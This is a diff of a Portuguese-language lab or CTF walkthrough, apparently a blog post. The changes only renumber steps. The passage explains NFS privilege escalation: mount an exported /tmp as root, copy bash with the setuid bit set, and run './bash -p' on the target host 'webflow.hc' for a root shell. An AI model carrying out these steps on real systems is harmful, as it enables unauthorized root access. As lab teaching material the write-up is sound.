@@ -138,13 +138,13 @@ showmount -e webflow.hc
 
 Como a saída exibiu o diretório /tmp* sendo exportado, podemos utilizá-lo para criar arquivos localmente — através do NFS — que serão montados no servidor com permissões efetivas de root. Dessa forma, conseguimos manipular arquivos no diretório exportado de maneira privilegiada, permitindo que o usuário da máquina alvo execute esses arquivos e possua permissão elevada.
 
-1.      Primeiramente, precisamos obter acesso como root.
+1 - Primeiramente, precisamos obter acesso como root.
 
 ```bash
 sudo su
 ```
 
-2.      Após obter acesso como root, criamos um diretório para montar o compartilhamento NFS.
+2 - Após obter acesso como root, criamos um diretório para montar o compartilhamento NFS.
 
 ```bash
 mkdir /mnt/nfs
@@ -152,37 +152,37 @@ mkdir /mnt/nfs
 > ⚠️ Não é obrigatório criar o ponto de montagem especificamente dentro de /mnt. Esse diretório é apenas uma convenção utilizada em sistemas Unix-like. Podemos definir qualquer caminho como ponto de montagem, desde que o diretório exista e tenhamos permissões adequadas para utilizá-lo.
 {: .prompt-warning}
 
-3.      Montamos o diretório exportado via NFS utilizando o comando:
+3 - Montamos o diretório exportado via NFS utilizando o comando:
 
 ```bash
 mount -t nfs webflow.hc:/tmp /mnt/nfs
 ```
 
-4.      Acessamos o diretório.
+4 - Acessamos o diretório.
 
 ```bash
 cd /mnt/nfs
 ```
 
-5.      Copiamos o binário local /bin/bash para o diretório atual (/mnt/nfs).
+5 - Copiamos o binário local /bin/bash para o diretório atual (/mnt/nfs).
 
 ```bash
 cp /bin/bash .
 ```
 
-6.      Setamos o bit setuid no arquivo bash. +s faz com que, quando o binário for executado, o processo herde o UID do dono do arquivo em vez do UID do usuário que executou.
+6 - Setamos o bit setuid no arquivo bash. +s faz com que, quando o binário for executado, o processo herde o UID do dono do arquivo em vez do UID do usuário que executou.
 
 ```bash
 chmod +s bash
 ```
 
-7.      Usamos o comando abaixo para ver a montagem do arquivo.
+7 - Usamos o comando abaixo para ver a montagem do arquivo.
 
 ```bash
 df -h
 ```
 
-8.      No shell do servidor, acessamos o diretório /tmp e executamos o binário com o bit SUID aplicado.
+8 - No shell do servidor, acessamos o diretório /tmp e executamos o binário com o bit SUID aplicado.
 
 ```bash
 ./bash -p
